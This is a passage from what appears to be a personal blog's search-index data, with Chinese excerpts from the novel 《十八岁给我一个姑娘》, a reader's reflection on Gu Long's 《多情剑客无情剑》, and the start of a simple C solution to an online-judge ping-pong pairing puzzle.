喊醒所有睡着了的人，让所有的人都知道，自己在鬼哭狼嚎，自己在鬼哭狼嚎地喜欢着一个姑娘。 \u0026quot;\n\u0026ldquo;为什么现在不是一千年以前？作屠夫的如果胳膊粗,可以象樊哙一样挥舞着杀猪刀去取人首级。如果舌头长,可以周游列国搬弄是非。哪怕阳物伟岸，也可以插进车轮，定住马车，让武则天听到谣言招进宫去。即使现在是一百年前,也能把朱裳抢上山去。过去好啊，斗殴和强奸一样，都是生存手段，现在都要受法律制裁。\n现在是现在，街上有“面的”，路灯会定时熄灭定时亮起。现在能干什么呢?\n“我这回真的信了，我信了还不行吗？”我听进我自己的声音突然变小，变得轻柔：“如果这辈子我能娶到朱裳，就让她屋子里的灯亮了吧！亮了我就信了。”\n“让灯亮了吧。”\n“亮了吧！”\n那盏灯突然亮了，一点道理没有地突然亮了，在我念第三遍咒语的时候亮了。\n我一路小跑，躲进我的房间里。 \u0026quot;\n\u0026ldquo;我和张国栋认为是她的诗才太盛，但是表达能力太差，郁积在胸，变成了胆囊结石和胆管结石。\u0026rdquo;\n\u0026ldquo;代课语文老师仗着他的大脑袋，精通中国文人的传统绝技：牢骚与胡说八道\u0026rdquo;\n\u0026ldquo;比如讲公子重耳时，至少要讲重耳的板肋与重瞳，板肋就是排骨中间没肉，连成一块。重瞳就是一只眼睛里有两个瞳仁，天生的四眼，很吓人。如果讲台下的女学生们听得入迷，双手托腮，腮帮子白里透红，语文老师还要讲起重耳像女人珍视她们乳房一样珍视他的板肋，时常抚摸，他逃亡的时候，有个国君趁他洗澡的时候偷看了一眼他的板肋，重耳隐忍退让，当时什么也没说，等得势当上晋国国君之后，找了个借口把那个国君干掉了\u0026rdquo;\n\u0026ldquo;爱念书的几个人象往常一样，屁股和椅子紧紧地吸着，复习上课记的笔记：“陕西，手巾板儿朝后。山西，朝前……”\n鼻孔黑黑的男生对着同桌的眉眼傻笑：摊上新来了批水洗布的裤子,裤形不错，想不想一同去看看?\n几个臭小子绕着桌椅游走玩耍，互相拍打对方的身体以示友好：又过了一节课，你是否感觉幸福? \u0026quot;\n\u0026ldquo;还立志当采花大盗呢？扯淡。”我暗暗骂了自己一句。 \u0026quot;\n\u0026ldquo;你说要是哥伦布有个数学老师，他能发现新大陆吗？不能细听，听多了许多欲望都会没的。不仅食欲，兴许连春梦都没得做了呢。” \u0026quot;\n\u0026ldquo;穷文富武。文人吃饱了先想的一定是抱姑娘而不是写文章。不过，这或许是请客的真实目的呢。”\u0026rdquo;\n\u0026ldquo;我忽然不想上下午的政治课了，天阴了起来，我想回我的房间去。 \u0026quot;\n\u0026ldquo;桌子的右手是扇窗子，窗子里盛了四季的风景，花开花落，月圆月缺。桌子的左手是扇门，我走进来，反手锁上，世界就被锁在了外边。\n点亮灯，喝一口茶，屋里的世界便会渐渐活起来。曹操会聊起杀人越货，谈笑生死，以及如何同袁绍一起，听房，轮奸别人的新媳妇。毛姆会教我他的人生道理，最主要的一条是不要带有才气的画家或是写诗的到家里来，他们吃饱以后一定会勾引你的老婆。受尽女人宠的柳永低声哼着他的《雨霖铃》，劳伦斯喃喃地讲生命是一程残酷无比的朝圣之旅。杜牧才叹了一声“相思入骨呀”，永远长不大的马克吐温便开始一遍遍教你玩儿时的种种把戏。 \u0026quot;\n\u0026ldquo;有些问题太难懂，仿佛上学离开妈妈，仿佛将来要将性命托给另外一个女人，仿佛现在心里喜欢上一个姑娘。小屋子太小了，容得下两个人吗？屋里的天地太大了，那个姑娘会喜欢吗？”\u0026rdquo;\n\u0026ldquo;我坐在桌子前，世界和自己之间是一堵墙，墙和自己之间是一盏灯，灯和自己之间是一本书。书和自己之间，是隐隐约约的朱裳的影子。\u0026rdquo;\n\u0026ldquo;看得见数学老师不停翕动，唾沫细珠乱蹦的嘴，但是听不见任何声音，教室静寂无声。看得见每个人脑袋里的血管和血管里的思想，但是无法判断是邪恶还是伪善\u0026rdquo;\n\u0026ldquo;我醒来的时候，发现和我躺在一张床上的李白、柳永、杜牧之流正用阴冷而狠毒的眼神看着我，张张惨白的脸在防腐剂中浸泡了千年，显得空洞而没有意义。\u0026rdquo;\n\u0026ldquo;大家富点了，钱怎么花呀?一是给自己花，有病看西医，没病看中医。\u0026rdquo;\n\u0026ldquo;出去淫荡吧!康大叔说得好，包好!包好!画阴阳盂的人巨聪明，你瞧，一阴，一阳，一男一女，你中有我，我中有你。一边多的正是一方边少的。我看，人心里都有个空荡荡的洞，你怎么努力，踢球、打牌、毛片、自提，没有用，最多只能堵住半边。就象阴阳盂，男孩只有泡在女孩那儿，才能补齐那半边，才能真正实在，才能真正愉快。去吧!包好，包好。”\u0026rdquo;\n\u0026ldquo;再捅捅，这得自己来了，我也帮不上你。仿佛和尚讲的‘悟’，师傅说出大天去也没有用，还得自己想明白。\u0026rdquo;\u0026rdquo;\n\u0026ldquo;有时候想明白也没有用，事情不经就没法明白。\u0026rdquo;\n\u0026ldquo;扯淡。即使有点感觉，又能怎么样呢？语文老师说：‘假如我的眼睛使你心跳，我就从你脸上移开我的目光；假如打桨激起了水波，就让我的小船离开你的岸边。’我和你不一样，我没有你挺。” 我又喝了一口酒。 \u0026quot;\n\u0026ldquo;他怎么想起来的？”\n“或许是长到时候了吧，和憋尿差不多。”\n“或许是天热，气烦。”\u0026rdquo;\n\u0026ldquo;阳正在下沉，“为什么初生的与要下沉的总是很大？”红红的、圆圆的，仿佛某种永难愈合的伤口。\u0026rdquo;\n\u0026ldquo;这是他的逻辑，不是我的逻辑，你知道我的，我没逻辑。\u0026rdquo;\n\u0026ldquo;你真仗义，如果没有‘然后’的话？”\n“然后咱俩把位子换过来。”\n“不干。”\n“只换半年。”\n“免谈。不干。”\u0026rdquo;\n\u0026ldquo;好吧，你等好吧。我知道你瞧不上我，一入校你就让我难看，你们都看不上我，我也会让你很难看的。”\u0026rdquo;\n\u0026ldquo;不再是楼群间的老路了\u0026rdquo;\n\u0026ldquo;朱裳后来告诉我，她脑子里浮现出那个很丑很丑的布娃娃，以及把娃娃剪成碎片的剪刀，没有继续想，重重地关上了门，转身靠在门框上，泪如泉涌。\u0026rdquo;\n\u0026ldquo;我在朱裳关门的一瞬间，瞥见她身后，阳台上，她白地粉花的内裤随风飘摇。\u0026rdquo;\n\u0026ldquo;我尤其喜欢评论的最后一段，感觉自己象是巫师，具备了盅惑人心的超能力。\u0026rdquo;\n\u0026quot;　最不喜欢一个人吃饭。在赶小说的过程中偶尔和几个小说中的原型吃饭，最后都是对着窗外的冬天，喝一口燕京纯生，感叹“人生苦短，还是喜欢干点什么就趁早干点什么\u0026rdquo;\n\u0026ldquo;灯市口大街北边有个打折书店，新书堆着卖，跟冬储大白菜似的，汗牛冲栋，从地板一直瘀到屋顶，王小波的全套四大本文集才卖二十元。当时一个恍惚，如五雷轰顶，信心顿失，这里面多少垃圾呀？五百年后有多少书还有人读呀？在这种认识下，要多大的牛逼和多大的自大狂才能撅着屁股写成十几万字，然后印在干干净净的白纸上，糟践好些用来制造白纸的树木和花花草草。想起那个日本鬼才芥川龙之介，怀疑自己能力的时候就打开阁楼的窗户，向着虚空，大声叫喊：“我是天才。”最后还是没用，三十五岁服了安眠药死掉。\u0026rdquo;\n\u0026ldquo;桃花落尽子满枝”，过去操场上领操的校花，如今正考虑什么时候破坏国家政策生第二胎，要不要自己开个幼儿园。何苦打着记录生命经验的旗号，再意淫人家一遍？\u0026rdquo;\n\u0026ldquo;于是热烈地盼望再有几个长假，把我不能不落在纸上的东西写完。写完了，心里面就该空荡荡的什么都没有了吧？再见老相好也能心如古井水，没有一丝波澜。于是热烈地盼望着没有写作冲动的那一天，然后就号称自己尘务经心，天分有限，一个字也不写了，就像热烈地盼望着阳痿的到来。\n野史说，江淹才尽后，过着吃喝嫖赌抽坑蒙拐骗偷的幸福生活。我愿意相信。\u0026rdquo;\n","permalink":"https://ret2neo.cn/mind/161212agirlfor18/","summary":"摘抄 \u0026ldquo;事后想来，如果时候对，如果老流氓孔建国会些医术，被当权部门用钉子钉死在木板上，过几百年就是另一个耶稣。如果老流氓孔建国会说很多事儿逼的话，被刘京伟、张国栋和我记录下来整理出版，过几千年就是另一个孔丘。 \u0026quot;\n\u0026ldquo;他说，如果时候对，围着他的这堆野小子里就会出刘邦，就会出朱元璋。\u0026rdquo;\n\u0026ldquo;我让老流氓孔建国高兴，因为我能迅速领会每一种精致的低级趣味，别的野小子还在做思想斗争的时候，我已经笑得很淫荡了。老流氓孔建国说我也让他头痛，因为我记性太好，老流氓孔建国不得不绞尽智慧回忆起或创造出新的趣事。这件事随着老流氓孔建国记忆力和创造力的减退以及我的不断成长而变得越发艰难。\u0026rdquo;\n\u0026ldquo;根据老流氓孔建国回忆，当老流氓孔建国有一天不得不怯生生地开始重复一个黄故事的时候，他在我的眼珠滚动里看到了一种他不能鄙视的鄙视。从那天起，我再也没有回过防空洞课堂。 \u0026quot;\n\u0026ldquo;我和老流氓孔建国讨论，我说刘京伟眼里有光、下身总是硬硬的、元气充盈，将来一定了不起。他骨子里的贪婪常常体现在小事情上，一根冰棒，他会一口吞到根部，再慢慢从根部嘬到尖尖儿，第一口就定下基调：从根到尖，涂满他的哈喇子，全部都是他的。老流氓孔建国却说他神锋太俊，知进不知退，兴也速、败也速，弄不好，还有大祸，充其量也就是一个军阀的胚子。我听了糊里糊涂的。老流氓孔建国又说，我也很贪婪，眼里也有光，但是我的眼底有很重的忧郁。我更糊涂了，知道不是什么好话，就嚷嚷：“你丫别扯淡了，我平面几何考试怎么及格还不知道呢。你再胡说，我到胡大妈那儿告你企图鸡奸。” \u0026quot;\n\u0026ldquo;楼下老头子们讲，梦里的都是妖魔鬼怪，吸走的都是真阳。真阳没了，眼珠子也就不转了，鼻涕快流进嘴角的时候也不能及时地吸进鼻孔了。 \u0026quot;\n\u0026ldquo;他们说起他们过去的故事，我总是将信将疑。 \u0026quot;\n\u0026ldquo;没有法子，男人只有自己出门找水喝， 怕人家不乐意给， 随身带上了刀。 \u0026quot;\n\u0026quot;　黑胖子的老婆说黑胖子原来在炮兵部队上是厨师班长，从来只负责偷吃不管干活。我想，没有比黑胖子过去的职业更悲惨的了，戴绿帽子、背黑锅、看别人打炮。\n\u0026quot;\n\u0026ldquo;明里不见人头落，暗中叫你骨髓枯。刘京伟和张国栋认定，随着时间流逝，我即使不会精尽而亡，也会渐渐出落成为一个没有出息的笨人\u0026rdquo;\n\u0026ldquo;她可能不是同谋，只是阴谋的一部分。 \u0026quot;\n\u0026ldquo;我看不见人们的灵魂，但是，隔着裤裆，我看得见他们的阴茎。\u0026rdquo;\n\u0026ldquo;我当然也有理想啊。我的理想是娶最漂亮的姑娘，写最无聊的文章，精忠报国，实现四个现代化。你是我见过的最漂亮的姑娘，不娶你娶谁呀？” \u0026quot;\n\u0026ldquo;你以为是个生人，或许他曾经和你睡过同一个姑娘呢。” \u0026quot;\n\u0026ldquo;桑保疆是倒尿盆长大的，这个，他懂不了。\n\u0026quot;\n\u0026ldquo;其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。 \u0026quot;\n\u0026ldquo;我的长相平庸而粗糙，但是我的内心精致而细腻。我和老流氓孔建国说，别看我长得象个杀猪的，其实我是个写诗的。 \u0026quot;\n\u0026ldquo;那个写诗的晚上，我速读《诗经》，跳过所有祭祀章节和不认识的文字，明白了“赋比兴”和“郑风淫”、最大的写诗诀窍就是找到心中最不安最痒痒的一个简单侧面，然后反复吟唱。那个写诗的晚上，我写完了我这辈子所有的诗，之后再也没有写过一句，就象我在十六岁至十八岁期间耗尽了我对姑娘的所有细腻美好想象，之后，所有的姑娘在我的眼里都貌美如花。\u0026rdquo;\n\u0026ldquo;我以前总是纳闷，街面上日日在自己面前飘然而过的那些美若天仙的姑娘们回家后都和谁睡觉。观察过朱裳父母之后我清楚了，就是和朱裳爹这种人。这种人坐不出龙椅和马扎的区别，赏受着上等的女人，无知无觉，问心无愧，如得大道。否则的话，对绿帽子的担心，就会让他少二十年阳寿。 \u0026quot;\n\u0026ldquo;美人在专心开车，不象平日里一样过分专注于自己的美丽，所以格外好看。 \u0026quot;\n\u0026ldquo;后来，我学了心理学，才感觉到，少年时期很多美好想象都是境由心生，没看过猪跑，更没吃过猪肉，把对凤凰的想象都拽到母猪身上了。 \u0026quot;\n\u0026ldquo;我一觉醒来，大吼一声：“大梦谁先觉，平生我自知”。想起过去创作这首打油诗的诸葛亮，在那个叫南阳卧龙岗的地方，种田、读书、钱多的时候叫鸡、钱少的时候手淫，觉得自己生不逢时。 \u0026quot;\n\u0026ldquo;是孔明就要论天下，是关公就要舞大刀”。刘京伟和张国栋听到，一定会加盟，老流氓孔建国听到，一定会加盟，这就是文字的力量。 \u0026quot;\n\u0026ldquo;现在的空气脆而冷，就在这种天气里，一个案件发生了重大的转折，好人坏人正义邪恶变得混沌不清，各种关系纠缠在一起，不是案件，而是一个阴谋。女孩作为一个整体在这个阴谋里起的作用极其重大而微妙，朱裳的意义更加隐涩。\u0026rdquo;\n\u0026ldquo;好象忽然一夜间，所有男生都想有一双名牌运动鞋，耐克、阿迪达斯、彪马…仿佛一双名牌鞋能添无数牛逼和小女生的目光。在之后的进化过程中，男生变成男青年，中年男子，老头，这双名牌运动鞋也随着变成名牌手提电脑和名牌山地车，一米七八一头长发的妖艳女友和宝马Z3以及郊区豪宅，一米六零胸大无脑柔腻软滑的十八岁女孩和明紫檀木画案以及半米长的红山玉龙形钩，但是，给予不同阶段的男性生物，同样的渴望、困扰、狂喜和无可奈何。 \u0026quot;\n\u0026ldquo;刘京伟是个头脑灵活但是无比简单的人。他短暂的一生都在追求牛逼。不同阶段，追求不同的牛逼，所有追求到的牛逼加总就构成了刘京伟短暂而牛逼的一生。 \u0026quot;\n\u0026ldquo;第二天，刘京伟请我和张国栋在朝阳门外的桥头酒店吃五块一斤的三鲜饺子，他吃得很少，两手抱着他新买的白地蓝钩高帮耐克鞋，那双鞋用鞋带串在一起，跨在他脖子上，左脸边一只，右脸边一只，每只都比他的脸大，比他脸白。刘京伟两眼望着天花板长久沉默，他忽然说：“牛逼，牛逼啊。\u0026rdquo;\n\u0026ldquo;后来，刘京伟的激素水平发育到觉得有个妖艳女友是牛逼的。刘京伟对我说：“我没有你会臭侃山，没有张国栋长得清秀。我怎么办呀？”我说：“总有办法的。”张国栋说：“再生一回吧。”刘京伟说：“张国栋你闭嘴。只要我活着，就会比你牛逼。你再清秀也是一堆清秀的狗屎。我和秋水说话。秋水，你有一点我特别佩服，你的自制力极好。你一个人呆的时候该看书也看书，该修炼你的文字就修炼你的文字。我也要在一个指定的方向上使力气，我也要修炼。”他于是修炼了一身腱子肉，条条块块，是姑娘都想摸。他冬天也穿紧身短袖，像个脱了皮的蛤蟆。为了长肌肉，他每天不吃饭，在最短的时间喝二十五个生鸡蛋。\u0026rdquo;\n\u0026ldquo;。张国栋问刘京伟，这样练，阳具也跟着变大吗？刘京伟说，不是，反而缩小，因为血都充到其他大块肌肉上去了。张国栋说，那我就不练了。我说，锻炼不同肌肉的道理是一样的，就是反复充血，你应该多看黄书，但是要保持不射。张国栋说，自摸行吗？刘京伟看了看我，我们同时说，行，可你丫能保持不射吗？\u0026rdquo;\n\u0026ldquo;再后来，刘京伟的大奔里没有姑娘香水味了，刘京伟欢快地对我说：“你知道现在最牛逼的是什么吗？是雇哈佛大学毕业的MBA。我把姑娘们都打发了，雇了三个今年刚从哈佛大学毕业的MBA。\u0026rdquo;\n\u0026ldquo;这时候的女孩个个可看。即使最丑的姑娘也有动人的时候。\n\u0026quot;\n\u0026ldquo;后来的后来，我在老流氓孔建国的教导下玩玉。老流氓孔建国说：“你早上睡醒之后，摸摸下体，如果已经不是一柱擎天了，说明你的真阳已经不足。有些人在三十发现，有些人四十。这时候，你对真善美的兴趣就应该从姑娘转到玉。处女是新玉新工，贼光扎眼。二十几岁是清初件，康乾盛世呀。三十几岁是宋元明，‘明大粗’。四十来岁是商周古玉，铅华洗尽，没有一丝火气，美呀。玉好像姑娘，也需要陪，需要珍爱，需要一日三摸搓，可以戴，可以显摆，可以放进被窝儿。玉比姑娘好，不离不弃，不会逼你一夜三举，还可以洗洗留给儿子。算了算了，别老想着朱裳和翠儿了，昨天我在古玩城小崔那儿看见一个商早期的圆雕玉虎，青玉，十多个厘米长，沁色美极了，太少见了，图谱上有片儿的，够上拍卖会进博物馆的。准备几万块钱，咱们明天把它拿下。\u0026rdquo;\n\u0026ldquo;不要老拿你的大油手在玉上摸来摸去，玉会污的，污了就再也干净不了了。真正的盘玉，是戴在身边，用身子煨着，用脑子想着，把你意淫文字的功夫用到这儿来，一两个星期用热水泡一下，用粗白布擦。不要老拿你大油手摸，糟践好东西。”\u0026rdquo;\n\u0026ldquo;我们不要音乐要叫喊，\n我们不要道理要金钱，\n我们不要先生要混蛋，\n我们不要女生要天仙。\n为什么越用功的女孩脸蛋越苦？\n为什么我越想越糊涂？\n为什么几千年都过去了，\n还没有另一个秦始皇烧干净书？\n姑娘你仰头总是绷着漂亮的脸，\n仿佛要沾你的一定是个款，\n为了心理平衡我想问几遍，","title":"《十八岁给我一个姑娘》"},{"content":"﻿这是我人生中第一本武侠小说，据说这也是古龙先生的巅峰之作，只因为在知乎上有人提到看古龙先生的作品千万别从《多情剑客无情剑》看起，因为曾经沧海难为水，再看其他的就显得干燥无味了，于是，便有了这一篇读后感。\n“冷风如刀，以大地为砧板，视众生为鱼肉。万里飞雪，将苍穹作烘炉，溶万物为白银。”冷风，飞雪是大地上苍穹下恒久的寂寞，众生，万物皆被寂寞宰杀，犹如鱼肉之于刀俎，无可奈何，不曾停歇。长文以此为始，我猜想这定是个骨子里透着悲伤的人在说一个悲伤的故事，故事里有一个寂寞的主角，在苍茫大地上漂泊，用生命诠释着寂寞。 “世上太多烦恼，岂非是因为笑得太少？笑，就像是香水，不但能令自己芬芳，也能令别人快乐。你若令别人一笑，纵然做做愚蠢的是又何妨？”直到看到了文章的结尾，才知寂寞因真情而起，却也终因真情而得以排解。\n小李探花李寻欢十数年前抛弃所爱之人，故乡，名利，出关漂泊，只留下鼎鼎大名在关中流传——“小李飞刀，例不虚发”。他舍弃了自己的本心，情愿自我折磨以成全好友龙啸云对林诗音的爱，这是古龙先生对他的大侠设定，我也因此对之有所钦佩，只是令我疑惑的是，时隔多年，林诗音与龙啸云已然成家生子，美满和谐，李寻欢归来，竟不怕徒生波折，多年苦心付诸东流？掩卷思之，唉，毕竟凡人。一走了之自然干脆利落，只是后来，痛苦从没停止。他可以成全重义轻色作为侠客的自己，却始终无法抹煞灵魂深处对于林诗音不曾停过的思念。十多年来，每一刀所刻画出的她脸庞上的线条，每一个刻成的眉眼熟悉的她，每一个埋下的她，都是他试图淡忘的努力，只是有些女人就像长在男人心底的朱砂痣，时间越久，盛开得越是红火，越是鲜艳，比如，李寻欢心中的林诗音，又或者，自己心中的那个她。我相信爱情能让人忘记时间，但是深情如他，时间，即便是十年之久的光阴，都无法让他忘掉哪怕一点点的细节，她在他的心中，在他的刀下，只是越来越清晰，越来越和那个青梅竹马的女孩重合。\n每当我想着那样一把随时可能悄无声息的以迅雷不及掩耳之速射出，没入喉管，饮满鲜血的冰冷的刀，在一个历经折磨，沧桑却不改深情的男人手中一点点勾勒出他最爱的女人的模样时，许多情绪便接连涌出，感动，无奈，悲伤，厌恶，嘲讽……他们形状各异，却各有缘由，细看之下每一样都能让我透不过气，每一项都在折射着作为人的悲哀。\n李寻欢啊，你爱的是林诗音吗？还是其他的什么？你是真的爱吗？你说是，那为什么会有当初的放弃呢？呵呵，你只替自己想过吧。爱情可以转让吗？合适吗？值得吗？过去也都罢了，那么如今呢，归来何用？怎就看不破。\n其实也不怪你，你太寂寞了。这样一个不犯佳人，不负美酒的有能耐的男人，这样一个天下敬仰，才情横溢的有魅力的男人，这样一个少年成名，义薄云天的有质量的男人，自然需要些不可自拔的东西来消费自己，耗散人生，比如深情，比如幻想。\n后来有了小红，于是幻想放在一旁，随她去吧。毕竟过去的已经过去了。这是多么深刻的真理啊，足以慰藉这十年一梦的荒唐了。\n自然，你是小李飞刀，你可以为随便一个你以为可以是兄弟的人放弃，销毁一个你深爱也爱你不浅的女人和她的豆蔻年华，甚至她的漫漫人生，你可以亲手舍弃真心而沉浸在十年一日的自我折磨中，你可以情不自禁地归来，无辜任性地破坏，自作自受的痛苦，我不适，我不悦，但我不怪，因为我知道，这不只是因为你是小李飞刀，更因为你首先是一个人。感情之于人，就是这样的虚伪和荒唐，矛盾与悲哀。\n剑客是人，剑是人生，多情的人，无情的人生啊！\n阿飞，阿飞，你终于还是成了李寻欢，你比他有过之而无不及。或许，你不该遇上他的。\n你本是纵横荒野，睥睨天地的万兽之王，只是如今，竟也被这鲜美皮囊，花言巧语，假意虚行困在牢笼里。我不怪林仙儿，她或许淫荡，或许邪恶，但也或许，或许真的爱你。只是恨你，你怎就动了爱的念头呢？你喝不起酒，难道自觉地爱得起吗？你看，忘了当初了吧。回头看，你曾是多么的睿智和明白啊。如今呢，你简直已被毁了。我为你感到心痛，但也明白，你若没这一遭，大概人生也显得有些无趣了。前面那些年的痛苦和煎熬，没了后面的堕落与荒谬，倒也显得苍白无用了。\n这几日，阿飞数院里梅花的场景常常浮现在我脑海里，说实话，我是有些羡慕的。虽然我没有那么快的剑，没有那样敏锐的身体和大脑，没有冰天雪地般恶劣的成长环境，没有享受过林仙儿般的温存，没有体验过，透入骨髓的寂寞，但是我也有浪荡江湖的渴望，偶遇佳人的企盼，长相厮守的梦想，还有，还有，执迷不悟的少年心。\n我为阿飞扼腕，并假想如果我是他，我一定能够敏感地一早识破林仙儿的谁都可以，流氓般地可以了那谁都可以的林仙儿，然后抛弃她，找回自己，再然后，仗剑天涯，让世人都惊畏那把像玩具的刀。我为李寻欢叹息，并假想如果我是他，一定不会让龙啸云和林诗音升温，更不可能让步远走，因为那是我爱的，无论是谁，什么理由，都不可能拿走，更何况，我是李寻欢，例不虚发的小李飞刀。我会爱她，好好爱，用全部爱，会陪她看每一年的红梅，而不是守着红梅想她如今的样子。\n我想的很好，很周到，独独忘了一点，我不是阿飞，我不是李寻欢，而且，如果我成了他们，他们也就不再是他们了。\n无论是阿飞，还是小李探花，他们都是大侠，有着大侠的格局，而我只是个小人物，死守着小人物应有的格局。在我的生活里，没有动辄夺命的强大，只有任人鱼肉的弱小，没有仗剑独行的潇洒，只有乌合于众的无奈，没有挥霍一切的资本，只有救赎不完的责任。我看着自己在这十丈软红里醉生梦死，想要呼喊，想要咆哮，却发不出什么声音。\n虽然对这一切感到绝望，但是至少，我还能够想热爱便热爱，想受伤便受伤，也算是生活给的最后的出路吧。\n读些武侠，算是对这生存以上生活以下的现状的一丝反抗吧。看那些故事里的人在岁月中进进出出，笑笑哭哭，我也能佯装通透地陪着叹声“梦中不知身是客，一晌贪欢”。 无论如何，我希望阿飞，李寻欢，或者我自己，都能找到自己，活好一次。\n","permalink":"https://ret2neo.cn/mind/160825weaponandwoman/","summary":"﻿这是我人生中第一本武侠小说，据说这也是古龙先生的巅峰之作，只因为在知乎上有人提到看古龙先生的作品千万别从《多情剑客无情剑》看起，因为曾经沧海难为水，再看其他的就显得干燥无味了，于是，便有了这一篇读后感。\n“冷风如刀，以大地为砧板，视众生为鱼肉。万里飞雪，将苍穹作烘炉，溶万物为白银。”冷风，飞雪是大地上苍穹下恒久的寂寞，众生，万物皆被寂寞宰杀，犹如鱼肉之于刀俎，无可奈何，不曾停歇。长文以此为始，我猜想这定是个骨子里透着悲伤的人在说一个悲伤的故事，故事里有一个寂寞的主角，在苍茫大地上漂泊，用生命诠释着寂寞。 “世上太多烦恼，岂非是因为笑得太少？笑，就像是香水，不但能令自己芬芳，也能令别人快乐。你若令别人一笑，纵然做做愚蠢的是又何妨？”直到看到了文章的结尾，才知寂寞因真情而起，却也终因真情而得以排解。\n小李探花李寻欢十数年前抛弃所爱之人，故乡，名利，出关漂泊，只留下鼎鼎大名在关中流传——“小李飞刀，例不虚发”。他舍弃了自己的本心，情愿自我折磨以成全好友龙啸云对林诗音的爱，这是古龙先生对他的大侠设定，我也因此对之有所钦佩，只是令我疑惑的是，时隔多年，林诗音与龙啸云已然成家生子，美满和谐，李寻欢归来，竟不怕徒生波折，多年苦心付诸东流？掩卷思之，唉，毕竟凡人。一走了之自然干脆利落，只是后来，痛苦从没停止。他可以成全重义轻色作为侠客的自己，却始终无法抹煞灵魂深处对于林诗音不曾停过的思念。十多年来，每一刀所刻画出的她脸庞上的线条，每一个刻成的眉眼熟悉的她，每一个埋下的她，都是他试图淡忘的努力，只是有些女人就像长在男人心底的朱砂痣，时间越久，盛开得越是红火，越是鲜艳，比如，李寻欢心中的林诗音，又或者，自己心中的那个她。我相信爱情能让人忘记时间，但是深情如他，时间，即便是十年之久的光阴，都无法让他忘掉哪怕一点点的细节，她在他的心中，在他的刀下，只是越来越清晰，越来越和那个青梅竹马的女孩重合。\n每当我想着那样一把随时可能悄无声息的以迅雷不及掩耳之速射出，没入喉管，饮满鲜血的冰冷的刀，在一个历经折磨，沧桑却不改深情的男人手中一点点勾勒出他最爱的女人的模样时，许多情绪便接连涌出，感动，无奈，悲伤，厌恶，嘲讽……他们形状各异，却各有缘由，细看之下每一样都能让我透不过气，每一项都在折射着作为人的悲哀。\n李寻欢啊，你爱的是林诗音吗？还是其他的什么？你是真的爱吗？你说是，那为什么会有当初的放弃呢？呵呵，你只替自己想过吧。爱情可以转让吗？合适吗？值得吗？过去也都罢了，那么如今呢，归来何用？怎就看不破。\n其实也不怪你，你太寂寞了。这样一个不犯佳人，不负美酒的有能耐的男人，这样一个天下敬仰，才情横溢的有魅力的男人，这样一个少年成名，义薄云天的有质量的男人，自然需要些不可自拔的东西来消费自己，耗散人生，比如深情，比如幻想。\n后来有了小红，于是幻想放在一旁，随她去吧。毕竟过去的已经过去了。这是多么深刻的真理啊，足以慰藉这十年一梦的荒唐了。\n自然，你是小李飞刀，你可以为随便一个你以为可以是兄弟的人放弃，销毁一个你深爱也爱你不浅的女人和她的豆蔻年华，甚至她的漫漫人生，你可以亲手舍弃真心而沉浸在十年一日的自我折磨中，你可以情不自禁地归来，无辜任性地破坏，自作自受的痛苦，我不适，我不悦，但我不怪，因为我知道，这不只是因为你是小李飞刀，更因为你首先是一个人。感情之于人，就是这样的虚伪和荒唐，矛盾与悲哀。\n剑客是人，剑是人生，多情的人，无情的人生啊！\n阿飞，阿飞，你终于还是成了李寻欢，你比他有过之而无不及。或许，你不该遇上他的。\n你本是纵横荒野，睥睨天地的万兽之王，只是如今，竟也被这鲜美皮囊，花言巧语，假意虚行困在牢笼里。我不怪林仙儿，她或许淫荡，或许邪恶，但也或许，或许真的爱你。只是恨你，你怎就动了爱的念头呢？你喝不起酒，难道自觉地爱得起吗？你看，忘了当初了吧。回头看，你曾是多么的睿智和明白啊。如今呢，你简直已被毁了。我为你感到心痛，但也明白，你若没这一遭，大概人生也显得有些无趣了。前面那些年的痛苦和煎熬，没了后面的堕落与荒谬，倒也显得苍白无用了。\n这几日，阿飞数院里梅花的场景常常浮现在我脑海里，说实话，我是有些羡慕的。虽然我没有那么快的剑，没有那样敏锐的身体和大脑，没有冰天雪地般恶劣的成长环境，没有享受过林仙儿般的温存，没有体验过，透入骨髓的寂寞，但是我也有浪荡江湖的渴望，偶遇佳人的企盼，长相厮守的梦想，还有，还有，执迷不悟的少年心。\n我为阿飞扼腕，并假想如果我是他，我一定能够敏感地一早识破林仙儿的谁都可以，流氓般地可以了那谁都可以的林仙儿，然后抛弃她，找回自己，再然后，仗剑天涯，让世人都惊畏那把像玩具的刀。我为李寻欢叹息，并假想如果我是他，一定不会让龙啸云和林诗音升温，更不可能让步远走，因为那是我爱的，无论是谁，什么理由，都不可能拿走，更何况，我是李寻欢，例不虚发的小李飞刀。我会爱她，好好爱，用全部爱，会陪她看每一年的红梅，而不是守着红梅想她如今的样子。\n我想的很好，很周到，独独忘了一点，我不是阿飞，我不是李寻欢，而且，如果我成了他们，他们也就不再是他们了。\n无论是阿飞，还是小李探花，他们都是大侠，有着大侠的格局，而我只是个小人物，死守着小人物应有的格局。在我的生活里，没有动辄夺命的强大，只有任人鱼肉的弱小，没有仗剑独行的潇洒，只有乌合于众的无奈，没有挥霍一切的资本，只有救赎不完的责任。我看着自己在这十丈软红里醉生梦死，想要呼喊，想要咆哮，却发不出什么声音。\n虽然对这一切感到绝望，但是至少，我还能够想热爱便热爱，想受伤便受伤，也算是生活给的最后的出路吧。\n读些武侠，算是对这生存以上生活以下的现状的一丝反抗吧。看那些故事里的人在岁月中进进出出，笑笑哭哭，我也能佯装通透地陪着叹声“梦中不知身是客，一晌贪欢”。 无论如何，我希望阿飞，李寻欢，或者我自己，都能找到自己，活好一次。","title":"《多情剑客无情剑》"},{"content":" WHU OJ ，已无法访问\n1021乒乓球比赛 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;stdio.h\u0026gt; int main() { char i,j,k; for(i=\u0026#39;X\u0026#39;; i\u0026lt;\u0026#39;X\u0026#39;+3; i++) { for(j=\u0026#39;X\u0026#39;; j\u0026lt;\u0026#39;X\u0026#39;+3; j++) { for(k=\u0026#39;X\u0026#39;; k\u0026lt;\u0026#39;X\u0026#39;+3; k++) { if(j!=i\u0026amp;\u0026amp;k!=i\u0026amp;\u0026amp;k!=j) { printf(\u0026#34;%c %c\\n%c %c\\n%c %c\\n\u0026#34;,\u0026#39;A\u0026#39;,i,\u0026#39;B\u0026#39;,j,\u0026#39;C\u0026#39;,k); } } } } for(i=\u0026#39;X\u0026#39;; i\u0026lt;\u0026#39;X\u0026#39;+3; i++) { for(j=\u0026#39;X\u0026#39;; 